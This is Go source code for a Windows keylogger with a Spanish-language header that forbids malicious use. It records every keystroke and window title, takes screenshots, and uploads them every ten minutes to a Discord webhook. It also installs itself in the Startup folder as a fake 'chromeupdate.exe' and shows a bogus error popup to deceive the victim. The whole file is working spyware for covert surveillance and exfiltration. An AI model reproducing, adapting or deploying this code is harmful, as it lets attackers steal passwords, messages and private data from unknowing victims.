package main

//=================================================================//
//   Prohibido utilizar ésto con fines malévolos, o Caguen1aMar    //
//                      By Lázaro "LzByte"                         //
//=================================================================//

import (
	"image/png"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ecnepsnai/discord"
	"github.com/kbinani/screenshot"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	usr, _         = user.Current()
	usrName string = (strings.Split(usr.Username, "\\"))[1]

	//Config->
	discordWHlink      string = "https://discord.com/api/webhooks/y lo que sigue"
	varPath            string = "C:\\Users\\" + usrName + "\\AppData\\Roaming"
	persistencePath    string = varPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	persistenceExeName string = "\\chromeupdate.exe"
	sendLogsEvery      int    = 600 //En segundos
	clientIDHour       string = usr.Username + " [" + ((time.Now()).Format("15:04")) + "]"
	//<-Config

	alphabet string = "abcdefghijklmnñopqrstuvwxyz"

	tmpKeylog string
	tmpTitle  string
)

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	g, _ := getForegroundWindow()
	b := make([]uint16, 200)
	_, err := getWindowText(g, &b[0], int32(len(b)))
	if err != nil {
	}
	if syscall.UTF16ToString(b) != "" {
		if tmpTitle != syscall.UTF16ToString(b) {
			tmpTitle = syscall.UTF16ToString(b)
			tmpKeylog += string("\n[" + syscall.UTF16ToString(b) + "]\r\n")
		}
	}
}

func saveData() {
	if len(tmpKeylog) < 1900 {
		f, _ := os.Create(varPath + "\\d.txt")
		f.Write([]byte(tmpKeylog))
		defer f.Close()
	}

	img, _ := screenshot.CaptureDisplay(0)
	file, _ := os.Create(varPath + "\\z.png")
	defer file.Close()
	png.Encode(file, img)
}

func delData() {

	_ = os.Remove(varPath + "\\d.txt")
	_ = os.Remove(varPath + "\\z.png")
	tmpKeylog = ""
}

func discSend() {
	discord.WebhookURL = discordWHlink
	l, _ := os.Open(varPath + "\\d.txt")
	i, _ := os.Open(varPath + "\\z.png")

	if len(tmpKeylog) < 1900 {
		content := discord.PostOptions{
			Content: tmpKeylog, Username: clientIDHour,
		}
		FileOptions := discord.FileOptions{
			FileName: "screen.png",
			Reader:   i,
		}
		discord.UploadFile(content, FileOptions)
	} else {
		content := discord.PostOptions{
			Username: clientIDHour,
		}
		FileOptions := discord.FileOptions{
			FileName: "screen.png",
			Reader:   i,
		}
		discord.UploadFile(content, FileOptions)

		content = discord.PostOptions{
			Username: clientIDHour,
		}
		FileOptions = discord.FileOptions{
			FileName: "log.txt",
			Reader:   l,
		}
		discord.UploadFile(content, FileOptions)
	}

}

func keyLogger() {
	for {
		time.Sleep(10 * time.Millisecond)

		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			ValMayus, _, _ := procGetKeyState.Call(uintptr(0x14))
			ValShift, _, _ := procGetKeyState.Call(uintptr(0x10))

			if int(Val) >= 32769 {
				windowLogger()

				if charSwitch(KEY) != "" {
					tmpKeylog += charSwitch(KEY)

					if ValMayus > 0 || ValShift > 1 {
						lastCharTmpKeylog := tmpKeylog[len(tmpKeylog)-1:]

						if strings.Contains(alphabet, lastCharTmpKeylog) {
							lastCharUpperTmpKeylog := strings.ToUpper(lastCharTmpKeylog)
							tmpKeylog = strings.TrimSuffix(tmpKeylog, lastCharTmpKeylog)
							tmpKeylog += lastCharUpperTmpKeylog
						}
					}
				}
			}
		}
	}
}

func persistence() bool {
	dir, _ := filepath.Abs(filepath.Dir(os.Args[0])) 

	if dir != persistencePath { 
		go afterExecuteBehavior()

		time.Sleep(2 * time.Second)

		_, info := os.Stat(persistencePath + persistenceExeName)
		if os.IsNotExist(info) {

			exeCompletePath, _ := os.Executable()
			exeNameSplitted := strings.Split(exeCompletePath, "\\")
			exeName := exeNameSplitted[len(exeNameSplitted)-1]

			bytesRead, _ := ioutil.ReadFile(exeName)
			_ = ioutil.WriteFile(persistencePath+persistenceExeName, bytesRead, 0)
		}
		return true
	}
	return false
}

func afterExecuteBehavior() {
	//Ejemplo de mensaje de error en Powershell
	exec.Command(`powershell`, `$wshell=New-Object -ComObject Wscript.Shell;$wshell.Popup("x86 system required",0,"Error",0x1)`).Run()
}

func main() {
	executedFromStartup := persistence()
	if executedFromStartup {
		go keyLogger()
		for {
			time.Sleep(time.Duration(sendLogsEvery) * time.Second)
			saveData()
			discSend()
			delData()
		}

	}
}
